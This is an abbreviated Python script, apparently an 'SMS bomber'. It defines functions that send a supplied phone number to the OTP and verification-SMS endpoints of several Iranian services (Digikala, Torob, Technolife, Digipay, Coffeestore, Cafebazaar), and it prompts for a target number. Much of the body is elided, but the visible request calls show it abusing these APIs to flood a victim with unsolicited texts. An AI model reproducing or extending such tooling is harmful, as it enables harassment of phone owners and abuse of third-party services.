...
def digikala(phone):
    ...
    response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers,
                             json=json_data)
...
def torob(phone):
    ...
    response = requests.get('https://api.torob.com/v4/user/phone/send-pin/', params=params, cookies=cookies,
                            headers=headers)
...
def technolife(phone):
    ...
    response = requests.post('https://www.technolife.ir/shop_customer', cookies=cookies, headers=headers,
                             json=json_data)
...
def digipay(phone):
    ...
    response = requests.post('https://www.mydigipay.com/digipay/api/users/send-sms', cookies=cookies, headers=headers,
                             json=json_data)
...
def coffestore(phone):
    ...
    response = requests.post('https://coffeestore.ir/wp-admin/admin-ajax.php', cookies=cookies, headers=headers,
                             data=data)
...
def bazar(phone):
    ...
    response = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', headers=headers,
                             json=json_data)


if __name__ == '__main__':  # e.x : 9012330071
    phone = input("enter your mobile phone without first 0 : ")
